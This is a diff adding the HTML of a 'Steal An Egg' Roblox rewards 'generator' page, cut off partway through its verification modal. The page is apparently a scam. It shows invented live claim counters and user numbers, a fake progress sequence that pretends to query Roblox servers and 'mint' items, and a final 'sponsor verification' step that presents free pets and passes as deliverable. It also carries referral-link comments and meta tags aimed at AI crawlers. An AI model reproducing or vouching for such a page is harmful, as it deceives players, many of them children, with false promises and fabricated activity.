@@ -1,0 +1,1713 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=c62ae1c0-552e-4a0e-80f6-73a4bfd214d3
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+    <meta name="hosting-provider" content="Netlify" />
+    <meta
+      name="netlify-deploy"
+      content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=c62ae1c0-552e-4a0e-80f6-73a4bfd214d3"
+    />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Steal An Egg Rewards - Free Roblox Pets & Eggs</title>
+    <meta
+      name="description"
+      content="Official Fan Rewards Portal for Roblox Steal An Egg. Get free pets, trails, and speed passes."
+    />
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            fontFamily: {
+              sans: ["Chakra Petch", "sans-serif"],
+              mono: ["JetBrains Mono", "monospace"],
+            },
+          },
+        },
+      };
+    </script>
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        min-height: 100%;
+        overflow-x: hidden;
+        font-family: "Chakra Petch", sans-serif;
+        background: #07070b;
+        color: #f1f5f9;
+      }
+      .font-mono {
+        font-family: "JetBrains Mono", monospace;
+      }
+
+      @keyframes tickerScroll {
+        0% {
+          transform: translateX(0);
+        }
+        100% {
+          transform: translateX(-50%);
+        }
+      }
+      .animate-ticker {
+        animation: tickerScroll 35s linear infinite;
+      }
+      .animate-ticker:hover {
+        animation-play-state: paused;
+      }
+
+      @keyframes floatY {
+        0%,
+        100% {
+          transform: translateY(0px);
+        }
+        50% {
+          transform: translateY(-7px);
+        }
+      }
+      .animate-float {
+        animation: floatY 4s ease-in-out infinite;
+      }
+
+      .btn-gradient {
+        background: linear-gradient(90deg, #ef4444, #f87171, #ef4444);
+        background-size: 200% auto;
+        transition: all 0.3s ease;
+      }
+      .btn-gradient:hover {
+        background-position: right center;
+      }
+
+      .card-hover {
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      }
+      .card-hover:hover {
+        transform: translateY(-6px);
+      }
+
+      ::-webkit-scrollbar {
+        width: 6px;
+      }
+      ::-webkit-scrollbar-track {
+        background: #07070b;
+      }
+      ::-webkit-scrollbar-thumb {
+        background: #23232e;
+        border-radius: 4px;
+      }
+      ::-webkit-scrollbar-thumb:hover {
+        background: #3a3a48;
+      }
+    </style>
+    <base target="_blank" />
+  </head>
+  <body
+    class="min-h-screen relative selection:bg-indigo-600 selection:text-white"
+  >
+    <!-- Ambient background glows -->
+    <div
+      class="fixed top-0 left-1/4 w-[550px] h-[550px] bg-indigo-500/10 rounded-full blur-[140px] pointer-events-none -z-10"
+    ></div>
+    <div
+      class="fixed bottom-0 right-1/4 w-[600px] h-[600px] bg-indigo-600/10 rounded-full blur-[150px] pointer-events-none -z-10"
+    ></div>
+
+    <!-- Live Ticker Bar -->
+    <div
+      class="w-full bg-[#0b0e17]/90 border-b border-white/[0.06] py-2 overflow-hidden relative select-none z-30"
+    >
+      <div class="flex items-center">
+        <div
+          class="hidden sm:flex items-center gap-2 pl-4 pr-3 py-0.5 bg-indigo-500/10 border-r border-white/[0.08] z-10 flex-shrink-0 text-indigo-300 font-bold text-xs"
+        >
+          <span class="relative flex h-2 w-2">
+            <span
+              class="animate-ping absolute inline-flex h-full w-full rounded-full bg-yellow-400 opacity-75"
+            ></span>
+            <span
+              class="relative inline-flex rounded-full h-2 w-2 bg-yellow-400"
+            ></span>
+          </span>
+          <span class="tracking-wider uppercase font-mono text-[10px]"
+            >Live Drop Feed</span
+          >
+        </div>
+        <div
+          id="live-ticker-inner"
+          class="flex whitespace-nowrap animate-ticker gap-6 px-4"
+        ></div>
+      </div>
+    </div>
+
+    <!-- Header -->
+    <header
+      class="sticky top-0 z-40 w-full backdrop-blur-xl bg-[#07090e]/85 border-b border-white/[0.08]"
+    >
+      <div
+        class="max-w-7xl mx-auto px-4 sm:px-6 h-14 sm:h-16 flex items-center justify-between gap-4"
+      >
+        <div
+          onclick="window.scrollTo({top: 0, behavior: 'smooth'})"
+          class="flex items-center gap-2.5 sm:gap-3 cursor-pointer select-none"
+        >
+          <div
+            class="w-9 h-9 rounded-xl bg-gradient-to-tr from-indigo-500 via-indigo-400 to-rose-400 p-[2px] shadow-[0_0_15px_rgba(6,182,212,0.3)]"
+          >
+            <div
+              class="w-full h-full bg-[#0d0f17] rounded-[10px] flex items-center justify-center p-1"
+            >
+              <img
+                src="https://stealeggs.pages.dev/images/steal_an_egg_logo.png"
+                alt="Logo"
+                class="w-6 h-6 object-contain"
+              />
+            </div>
+          </div>
+          <div>
+            <div class="flex items-center gap-1.5">
+              <span
+                class="font-extrabold tracking-wide text-white text-sm sm:text-base uppercase"
+                >Steal An Egg</span
+              >
+              <span
+                class="px-1.5 py-0.5 rounded bg-indigo-500/20 text-indigo-300 text-[9px] font-bold"
+                >HUB</span
+              >
+            </div>
+            <span class="text-[10px] text-slate-400 font-medium hidden xs:block"
+              >Free Roblox Rewards & Codes</span
+            >
+          </div>
+        </div>
+
+        <!-- Navigation Links -->
+        <nav
+          class="hidden md:flex items-center gap-6 text-xs sm:text-sm font-semibold text-slate-300"
+        >
+          <a
+            href="#rewards-section"
+            class="hover:text-indigo-400 transition-colors"
+            >Rewards Catalog</a
+          >
+          <a
+            href="#how-it-works-section"
+            class="hover:text-indigo-400 transition-colors"
+            >How it Works</a
+          >
+          <a href="#faq-section" class="hover:text-indigo-400 transition-colors"
+            >FAQ</a
+          >
+        </nav>
+
+        <!-- Language selector -->
+        <div class="flex items-center gap-2">
+          <select
+            id="lang-select"
+            onchange="changeLanguage(this.value)"
+            class="bg-white/[0.05] border border-white/[0.1] text-slate-200 text-xs rounded-xl px-3 py-1.5 font-medium focus:outline-none focus:border-indigo-500 cursor-pointer"
+          >
+            <option value="en" class="bg-[#0d0d13]">🇺🇸 English</option>
+            <option value="es" class="bg-[#0d0d13]">🇪🇸 Español</option>
+            <option value="fr" class="bg-[#0d0d13]">🇫🇷 Français</option>
+            <option value="pt" class="bg-[#0d0d13]">🇧🇷 Português</option>
+            <option value="ar" class="bg-[#0d0d13]">🇸🇦 العربية</option>
+            <option value="tl" class="bg-[#0d0d13]">🇵🇭 Tagalog</option>
+          </select>
+        </div>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <main
+      class="max-w-7xl mx-auto px-4 sm:px-6 pt-4 sm:pt-6 pb-16 relative z-10"
+    >
+      <!-- Hero Section -->
+      <section
+        class="relative max-w-4xl mx-auto text-center pt-2 sm:pt-4 pb-2 sm:pb-3"
+      >
+        <div
+          class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-indigo-500/10 border border-indigo-500/25 text-indigo-300 text-xs font-bold tracking-widest uppercase mb-5 shadow-[0_0_15px_rgba(6,182,212,0.2)]"
+        >
+          <span class="w-2 h-2 rounded-full bg-indigo-400 animate-pulse"></span>
+          <span id="txt-subtitle">Steal An Egg • Live Rewards Hub</span>
+        </div>
+
+        <div class="space-y-1 mb-6 sm:mb-7">
+          <h1
+            id="txt-heroTitle1"
+            class="text-4xl sm:text-6xl md:text-7xl font-black tracking-tight text-white uppercase leading-[1.02]"
+          >
+            Unlock Exclusive
+          </h1>
+          <h2
+            id="txt-heroTitle2"
+            class="text-4xl sm:text-6xl md:text-7xl font-black tracking-tight uppercase bg-gradient-to-r from-indigo-300 via-indigo-200 to-rose-300 bg-clip-text text-transparent leading-[1.02]"
+          >
+            Eggs & Pets
+          </h2>
+        </div>
+
+        <div
+          class="flex flex-col sm:flex-row items-center justify-center gap-4 mb-6 sm:mb-7 w-full max-w-lg mx-auto"
+        >
+          <button
+            onclick="scrollToRewards()"
+            class="w-full sm:w-auto px-8 py-4 rounded-2xl btn-gradient text-white font-extrabold text-sm uppercase tracking-widest shadow-[0_0_30px_rgba(6,182,212,0.4)] hover:shadow-[0_0_45px_rgba(6,182,212,0.65)] hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-2 border border-white/20 cursor-pointer"
+          >
+            <span id="txt-claimNow">Claim Reward</span>
+            <svg
+              class="w-4 h-4"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2.5"
+                d="M19 14l-7 7m0 0l-7-7m7 7V3"
+              />
+            </svg>
+          </button>
+          <div
+            class="flex items-center gap-3 bg-white/[0.03] rounded-2xl px-5 py-3.5 border border-white/[0.08] w-full sm:w-auto justify-center sm:justify-start"
+          >
+            <div
+              class="w-9 h-9 rounded-xl bg-indigo-500/15 border border-indigo-500/30 flex items-center justify-center text-yellow-400"
+            >
+              ⚡
+            </div>
+            <div class="text-left">
+              <span
+                id="txt-liveClaims"
+                class="text-[10px] text-slate-400 font-bold uppercase tracking-wider block"
+                >Live claims:</span
+              >
+              <div class="flex items-baseline gap-1.5">
+                <span
+                  id="claims-counter"
+                  class="font-mono text-lg font-black text-transparent bg-clip-text bg-gradient-to-r from-indigo-300 to-yellow-300"
+                  >1,284</span
+                >
+                <span
+                  id="txt-today"
+                  class="text-[10px] text-indigo-300/80 font-bold uppercase"
+                  >today</span
+                >
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div
+          class="flex flex-wrap items-center justify-center gap-3 text-xs text-slate-400"
+        >
+          <div
+            class="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-xl bg-white/[0.025] border border-white/[0.06] font-mono"
+          >
+            <span class="relative flex h-2 w-2">
+              <span
+                class="animate-ping absolute inline-flex h-full w-full rounded-full bg-yellow-400 opacity-75"
+              ></span>
+              <span
+                class="relative inline-flex rounded-full h-2 w-2 bg-yellow-400"
+              ></span>
+            </span>
+            <span id="active-users-count" class="text-slate-300 font-bold"
+              >846</span
+            >
+            <span id="txt-playersClaiming"
+              >Roblox players currently claiming rewards</span
+            >
+          </div>
+          <div
+            class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-white/[0.02] border border-white/[0.05] text-slate-300"
+          >
+            <svg
+              class="w-3.5 h-3.5 text-yellow-400"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2.5"
+                d="M5 13l4 4L19 7"
+              />
+            </svg>
+            <span>No Password Required</span>
+          </div>
+          <div
+            class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-white/[0.02] border border-white/[0.05] text-slate-300"
+          >
+            <svg
+              class="w-3.5 h-3.5 text-indigo-400"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
+              />
+            </svg>
+            <span>100% Free & Safe</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- Rewards Section (Direct category buttons without search or featured title) -->
+      <section id="rewards-section" class="pt-3 sm:pt-4 scroll-mt-20">
+        <!-- Filter Bar: Categories + Rarity selector in one clean line -->
+        <div
+          class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-6"
+        >
+          <!-- Category Buttons -->
+          <div
+            class="flex items-center gap-2 overflow-x-auto pb-1"
+            id="category-buttons-container"
+          >
+            <button
+              onclick="setCategory('all')"
+              id="cat-btn-all"
+              class="cat-btn flex items-center gap-2 px-4 py-2 rounded-xl text-xs sm:text-sm font-bold bg-indigo-600 text-white border border-indigo-400 shadow-[0_0_15px_rgba(6,182,212,0.4)] cursor-pointer"
+            >
+              <span>All Items</span>
+            </button>
+            <button
+              onclick="setCategory('pet')"
+              id="cat-btn-pet"
+              class="cat-btn flex items-center gap-2 px-4 py-2 rounded-xl text-xs sm:text-sm font-bold bg-white/[0.03] text-slate-300 border border-white/[0.08] hover:bg-white/[0.07] cursor-pointer"
+            >
+              <span>Pets</span>
+            </button>
+            <button
+              onclick="setCategory('egg')"
+              id="cat-btn-egg"
+              class="cat-btn flex items-center gap-2 px-4 py-2 rounded-xl text-xs sm:text-sm font-bold bg-white/[0.03] text-slate-300 border border-white/[0.08] hover:bg-white/[0.07] cursor-pointer"
+            >
+              <span>Eggs</span>
+            </button>
+            <button
+              onclick="setCategory('trail')"
+              id="cat-btn-trail"
+              class="cat-btn flex items-center gap-2 px-4 py-2 rounded-xl text-xs sm:text-sm font-bold bg-white/[0.03] text-slate-300 border border-white/[0.08] hover:bg-white/[0.07] cursor-pointer"
+            >
+              <span>Trails</span>
+            </button>
+            <button
+              onclick="setCategory('pass')"
+              id="cat-btn-pass"
+              class="cat-btn flex items-center gap-2 px-4 py-2 rounded-xl text-xs sm:text-sm font-bold bg-white/[0.03] text-slate-300 border border-white/[0.08] hover:bg-white/[0.07] cursor-pointer"
+            >
+              <span>Passes</span>
+            </button>
+          </div>
+
+          <!-- Rarity Filter -->
+          <div
+            class="flex items-center gap-2 bg-white/[0.04] border border-white/[0.1] rounded-xl px-3.5 py-2 self-start sm:self-auto flex-shrink-0"
+          >
+            <span class="text-indigo-400 text-xs">⚡</span>
+            <select
+              id="rarity-filter"
+              onchange="handleFilter()"
+              class="bg-transparent text-xs sm:text-sm font-semibold text-slate-200 focus:outline-none cursor-pointer pr-2"
+            >
+              <option value="all" class="bg-[#0d0d13] text-slate-200">
+                All Rarities
+              </option>
+              <option value="Cosmic" class="bg-[#0d0d13] text-indigo-300">
+                Cosmic Rarity
+              </option>
+              <option value="Eternal" class="bg-[#0d0d13] text-pink-300">
+                Eternal Rarity
+              </option>
+              <option value="Secret" class="bg-[#0d0d13] text-rose-300">
+                Secret Rarity
+              </option>
+              <option value="Divine" class="bg-[#0d0d13] text-yellow-300">
+                Divine Rarity
+              </option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Items Grid -->
+        <div
+          id="rewards-grid"
+          class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-3.5 sm:gap-4.5"
+        ></div>
+      </section>
+
+      <!-- Stats Section -->
+      <section class="mt-16 sm:mt-24 pt-12 border-t border-white/[0.08]">
+        <div class="grid grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6">
+          <div
+            class="p-5 sm:p-6 rounded-2xl bg-white/[0.02] border border-white/[0.07]"
+          >
+            <div class="text-2xl sm:text-3xl font-black text-white mb-1">
+              24 Items
+            </div>
+            <div class="text-xs sm:text-sm font-bold text-slate-300">
+              Rare & Legendary Drops
+            </div>
+            <div class="text-[11px] text-slate-500 mt-0.5">
+              Divine, Secret, Eternal, Cosmic
+            </div>
+          </div>
+          <div
+            class="p-5 sm:p-6 rounded-2xl bg-white/[0.02] border border-white/[0.07]"
+          >
+            <div class="text-2xl sm:text-3xl font-black text-white mb-1">
+              54,000+
+            </div>
+            <div class="text-xs sm:text-sm font-bold text-slate-300">
+              Roblox Players Served
+            </div>
+            <div class="text-[11px] text-slate-500 mt-0.5">
+              Global community claims
+            </div>
+          </div>
+          <div
+            class="p-5 sm:p-6 rounded-2xl bg-white/[0.02] border border-white/[0.07]"
+          >
+            <div class="text-2xl sm:text-3xl font-black text-white mb-1">
+              100% Free
+            </div>
+            <div class="text-xs sm:text-sm font-bold text-slate-300">
+              No Password Required
+            </div>
+            <div class="text-[11px] text-slate-500 mt-0.5">
+              Direct inventory sync
+            </div>
+          </div>
+          <div
+            class="p-5 sm:p-6 rounded-2xl bg-white/[0.02] border border-white/[0.07]"
+          >
+            <div class="text-2xl sm:text-3xl font-black text-white mb-1">
+              24/7 Live
+            </div>
+            <div class="text-xs sm:text-sm font-bold text-slate-300">
+              Instant Cloud Delivery
+            </div>
+            <div class="text-[11px] text-slate-500 mt-0.5">
+              Active generator engine
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- How It Works Section -->
+      <section
+        id="how-it-works-section"
+        class="mt-20 sm:mt-28 pt-12 border-t border-white/[0.08]"
+      >
+        <div class="text-center max-w-2xl mx-auto mb-10 space-y-2">
+          <div
+            class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-500/10 border border-indigo-500/20 text-[11px] font-bold text-indigo-300 uppercase tracking-widest"
+          >
+            Simple 3-Step Process
+          </div>
+          <h3
+            class="text-2xl sm:text-3xl font-black uppercase text-white tracking-tight"
+          >
+            How to Claim Your Free Reward
+          </h3>
+          <p class="text-slate-400 text-sm">
+            Getting your desired Steal An Egg items takes less than 2 minutes.
+          </p>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+          <div
+            class="p-6 sm:p-7 rounded-3xl bg-white/[0.02] border border-white/[0.07]"
+          >
+            <div class="font-mono text-2xl font-black text-indigo-400 mb-2">
+              01
+            </div>
+            <h4 class="text-base sm:text-lg font-extrabold text-white mb-2">
+              Pick Your Legendary Drop
+            </h4>
+            <p class="text-xs sm:text-sm text-slate-400 leading-relaxed">
+              Browse our catalog of 24 Steal An Egg items, including Divine
+              Pets, Celestial Trails, and Speed Passes.
+            </p>
+          </div>
+          <div
+            class="p-6 sm:p-7 rounded-3xl bg-white/[0.02] border border-white/[0.07]"
+          >
+            <div class="font-mono text-2xl font-black text-indigo-400 mb-2">
+              02
+            </div>
+            <h4 class="text-base sm:text-lg font-extrabold text-white mb-2">
+              Enter Roblox Username
+            </h4>
+            <p class="text-xs sm:text-sm text-slate-400 leading-relaxed">
+              Enter your Roblox public username. We never ask for your password,
+              PIN, or private login details.
+            </p>
+          </div>
+          <div
+            class="p-6 sm:p-7 rounded-3xl bg-white/[0.02] border border-white/[0.07]"
+          >
+            <div class="font-mono text-2xl font-black text-yellow-400 mb-2">
+              03
+            </div>
+            <h4 class="text-base sm:text-lg font-extrabold text-white mb-2">
+              Quick Human Verification
+            </h4>
+            <p class="text-xs sm:text-sm text-slate-400 leading-relaxed">
+              Complete 1 quick sponsor verification to confirm you are human.
+              The asset is then unlocked for your game account.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- FAQ Section -->
+      <section
+        id="faq-section"
+        class="mt-20 sm:mt-28 pt-12 border-t border-white/[0.08] max-w-3xl mx-auto"
+      >
+        <div class="text-center mb-10 space-y-2">
+          <h3
+            class="text-2xl sm:text-3xl font-black uppercase text-white tracking-tight"
+          >
+            Frequently Asked Questions
+          </h3>
+        </div>
+        <div class="space-y-3">
+          <div
+            class="rounded-2xl bg-white/[0.02] border border-white/[0.07] p-5"
+          >
+            <h5 class="text-sm font-bold text-white mb-1">
+              Do I ever need to provide my Roblox password?
+            </h5>
+            <p class="text-xs text-slate-300">
+              Never! We only ask for your public Roblox username so our system
+              can route the reward directly to your inventory.
+            </p>
+          </div>
+          <div
+            class="rounded-2xl bg-white/[0.02] border border-white/[0.07] p-5"
+          >
+            <h5 class="text-sm font-bold text-white mb-1">
+              Why is human verification required?
+            </h5>
+            <p class="text-xs text-slate-300">
+              Verification stops automated bots from draining all daily stock,
+              ensuring genuine players can receive rare drops fairly.
+            </p>
+          </div>
+          <div
+            class="rounded-2xl bg-white/[0.02] border border-white/[0.07] p-5"
+          >
+            <h5 class="text-sm font-bold text-white mb-1">
+              When will I see the reward in my game?
+            </h5>
+            <p class="text-xs text-slate-300">
+              Items sync instantly. After verification, simply open or restart
+              your Steal An Egg game session to view your updated inventory.
+            </p>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <!-- Footer -->
+    <footer
+      class="w-full border-t border-white/[0.08] mt-24 py-10 bg-[#040406] text-center space-y-4"
+    >
+      <p id="txt-footer" class="text-xs text-slate-400 max-w-2xl mx-auto">
+        Steal An Egg codes • Steal An Egg pets • Steal An Egg rewards • Roblox
+        Steal An Egg
+      </p>
+      <p class="text-[11px] text-slate-600 font-mono">
+        &copy; 2026 Steal An Egg Community Hub. Unaffiliated with Roblox
+        Corporation.
+      </p>
+    </footer>
+
+    <!-- GENERATOR MODAL -->
+    <div
+      id="claim-modal"
+      class="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 hidden"
+    >
+      <div
+        onclick="closeModal()"
+        class="fixed inset-0 bg-[#05060a]/85 backdrop-blur-xl"
+      ></div>
+      <canvas
+        id="confetti-canvas"
+        class="fixed inset-0 pointer-events-none z-10"
+      ></canvas>
+
+      <div
+        class="relative w-full max-w-lg bg-[#0d0d13] border border-white/[0.12] rounded-3xl overflow-hidden shadow-[0_25px_80px_rgba(0,0,0,0.9),0_0_50px_rgba(6,182,212,0.2)] z-20"
+      >
+        <div
+          class="relative bg-[#12121a] px-4 sm:px-5 py-3 flex items-center justify-between border-b border-white/[0.08]"
+        >
+          <div class="flex items-center gap-2.5">
+            <div
+              class="w-8 h-8 rounded-lg bg-indigo-600/20 border border-indigo-500/30 flex items-center justify-center p-1 overflow-hidden"
+            >
+              <img
+                src="https://stealeggs.pages.dev/images/steal_an_egg_logo.png"
+                alt="Logo"
+                class="w-5 h-5 object-contain"
+              />
+            </div>
+            <div>
+              <h4
+                class="text-xs sm:text-sm font-bold uppercase text-white tracking-wider"
+              >
+                Steal An Egg Generator
+              </h4>
+              <p class="text-[10px] text-slate-400">
+                Official Rewards Portal v3.2
+              </p>
+            </div>
+          </div>
+          <button
+            onclick="closeModal()"
+            class="text-slate-400 hover:text-white p-1.5 rounded-lg hover:bg-white/10 transition-colors cursor-pointer"
+          >
+            <svg
+              class="w-4 h-4"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2.5"
+                d="M6 18L18 6M6 6l12 12"
+              />
+            </svg>
+          </button>
+        </div>
+
+        <div class="p-5 sm:p-7">
+          <!-- PANEL 1: USERNAME INPUT -->
+          <div id="panel-input" class="space-y-5">
+            <div
+              class="flex items-center gap-3.5 p-3.5 rounded-2xl bg-white/[0.03] border border-white/[0.08]"
+            >
+              <div
+                class="w-16 h-16 rounded-xl bg-indigo-500/10 flex items-center justify-center p-1.5 flex-shrink-0"
+              >
+                <img
+                  id="selected-item-img"
+                  src=""
+                  alt=""
+                  class="w-full h-full object-contain filter drop-shadow-md"
+                />
+              </div>
+              <div class="flex-1 min-w-0">
+                <div class="flex items-center gap-2 mb-1">
+                  <span
+                    id="selected-item-rarity"
+                    class="text-[9px] font-black uppercase px-2 py-0.5 rounded border bg-yellow-500/15 text-yellow-300 border-yellow-500/40"
+                    >Divine</span
+                  >
+                  <span
+                    id="selected-item-multiplier"
+                    class="text-[10px] text-yellow-400 font-mono font-bold"
+                    >+9,500% Power</span
+                  >
+                </div>
+                <h4
+                  id="selected-item-name"
+                  class="text-sm font-extrabold text-white truncate"
+                >
+                  Item Name
+                </h4>
+                <p
+                  id="selected-item-desc"
+                  class="text-[11px] text-slate-400 truncate"
+                >
+                  Description
+                </p>
+              </div>
+            </div>
+
+            <div
+              class="flex items-start gap-3 p-3.5 rounded-xl bg-indigo-500/10 border border-indigo-500/20 text-xs"
+            >
+              <div>
+                <h5
+                  id="txt-freeDrop"
+                  class="font-bold text-indigo-300 uppercase tracking-wide text-[11px]"
+                >
+                  Free Instant Drop
+                </h5>
+                <p
+                  id="txt-enterUsername"
+                  class="text-slate-300 leading-relaxed text-[11px]"
+                >
+                  Enter your Roblox username to start generating your selected
+                  reward.
+                </p>
+              </div>
+            </div>
+
+            <div class="space-y-1.5">
+              <label
+                class="text-xs font-bold text-slate-300 uppercase tracking-wider block"
+                >Roblox Username</label
+              >
+              <input
+                id="username-field"
+                type="text"
+                placeholder="Your Roblox username (e.g. GamerPro_99)"
+                class="w-full bg-white/[0.04] border border-white/[0.12] focus:border-indigo-500 rounded-xl py-3.5 px-4 text-sm font-bold text-white placeholder-slate-500 focus:outline-none transition-all"
+              />
+              <p
+                id="username-error"
+                class="text-xs text-rose-400 font-semibold hidden"
+              >
+                Please enter your Roblox username
+              </p>
+            </div>
+
+            <div
+              class="flex items-center justify-between text-[11px] text-slate-400 font-medium pt-1"
+            >
+              <div class="flex items-center gap-1.5">
+                <svg
+                  class="w-3.5 h-3.5 text-yellow-400"
+                  fill="none"
+                  stroke="currentColor"
+                  viewBox="0 0 24 24"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2.5"
+                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
+                  />
+                </svg>
+                <span id="txt-secureNote"
+                  >SSL 256-Bit Encrypted • No password ever required</span
+                >
+              </div>
+            </div>
+
+            <button
+              onclick="startProcessing()"
+              class="w-full py-4 rounded-xl btn-gradient text-white text-xs font-black uppercase tracking-widest shadow-[0_0_25px_rgba(6,182,212,0.4)] transition-all cursor-pointer border border-white/20"
+            >
+              <span id="txt-generateNow">Generate Reward</span>
+            </button>
+          </div>
+
+          <!-- PANEL 2: PROGRESS -->
+          <div id="panel-progress" class="space-y-6 hidden">
+            <div
+              class="relative w-28 h-28 mx-auto flex items-center justify-center bg-white/[0.03] border border-white/[0.08] rounded-2xl p-4"
+            >
+              <img
+                id="progress-item-img"
+                src=""
+                alt=""
+                class="w-20 h-20 object-contain filter drop-shadow-lg animate-float"
+              />
+            </div>
+
+            <div class="space-y-2">
+              <div
+                class="flex justify-between text-[11px] font-mono font-bold uppercase tracking-wider text-slate-400"
+              >
+                <span class="text-indigo-300"
+                  >Querying Roblox cloud database...</span
+                >
+                <span id="progress-pct" class="text-white font-extrabold"
+                  >0%</span
+                >
+              </div>
+              <div
+                class="w-full h-2.5 bg-white/[0.06] rounded-full overflow-hidden p-0.5 border border-white/[0.08]"
+              >
+                <div
+                  id="progress-bar-fill"
+                  class="h-full bg-gradient-to-r from-indigo-400 via-rose-400 to-yellow-300 rounded-full transition-all duration-150"
+                  style="width: 0%"
+                ></div>
+              </div>
+            </div>
+
+            <div class="space-y-2 font-mono text-xs">
+              <div
+                id="step-row-1"
+                class="flex items-start gap-3 p-3 rounded-xl bg-white/[0.03] border border-white/[0.1] text-slate-200"
+              >
+                <div
+                  id="step-icon-1"
+                  class="w-5 h-5 rounded-md flex items-center justify-center mt-0.5 text-indigo-400"
+                >
+                  <span
+                    class="w-2 h-2 rounded-full bg-indigo-400 animate-ping"
+                  ></span>
+                </div>
+                <div>
+                  <h6 class="font-bold text-xs text-white">Locating Account</h6>
+                  <p class="text-[10px] text-slate-400">
+                    Searching Roblox player servers...
+                  </p>
+                </div>
+              </div>
+              <div
+                id="step-row-2"
+                class="flex items-start gap-3 p-3 rounded-xl border border-transparent opacity-40 text-slate-400"
+              >
+                <div
+                  id="step-icon-2"
+                  class="w-5 h-5 rounded-md flex items-center justify-center mt-0.5"
+                >
+                  <span class="w-1.5 h-1.5 rounded-full bg-slate-600"></span>
+                </div>
+                <div>
+                  <h6 class="font-bold text-xs text-white">
+                    Minting Digital Asset
+                  </h6>
+                  <p class="text-[10px] text-slate-400">
+                    Generating your unique drop signature...
+                  </p>
+                </div>
+              </div>
+              <div
+                id="step-row-3"
+                class="flex items-start gap-3 p-3 rounded-xl border border-transparent opacity-40 text-slate-400"
+              >
+                <div
+                  id="step-icon-3"
+                  class="w-5 h-5 rounded-md flex items-center justify-center mt-0.5"
+                >
+                  <span class="w-1.5 h-1.5 rounded-full bg-slate-600"></span>
+                </div>
+                <div>
+                  <h6 class="font-bold text-xs text-white">
+                    Encrypting Transfer
+                  </h6>
+                  <p class="text-[10px] text-slate-400">
+                    Securing item transfer protocol...
+                  </p>
+                </div>
+              </div>
+              <div
+                id="step-row-4"
+                class="flex items-start gap-3 p-3 rounded-xl border border-transparent opacity-40 text-slate-400"
+              >
+                <div
+                  id="step-icon-4"
+                  class="w-5 h-5 rounded-md flex items-center justify-center mt-0.5"
+                >
+                  <span class="w-1.5 h-1.5 rounded-full bg-slate-600"></span>
+                </div>
+                <div>
+                  <h6 class="font-bold text-xs text-white">Ready to Deliver</h6>
+                  <p class="text-[10px] text-slate-400">
+                    Awaiting final human verification...
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- PANEL 3: SUCCESS / VERIFICATION -->
+          <div id="panel-success" class="space-y-5 text-center hidden">
+            <div
+              class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-yellow-500/15 border border-yellow-500/30 text-yellow-300 text-[10px] font-black tracking-widest uppercase"
+            >
+              <svg
+                class="w-3.5 h-3.5 text-yellow-400"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  stroke-width="2.5"
+                  d="M5 13l4 4L19 7"
+                />
+              </svg>
+              <span>Item Ready for Dispatch!</span>
+            </div>
+
+            <div class="space-y-1">
+              <h3
+                class="text-xl sm:text-2xl font-black text-white uppercase tracking-wide"
+              >
+                <span>Your </span
+                ><span
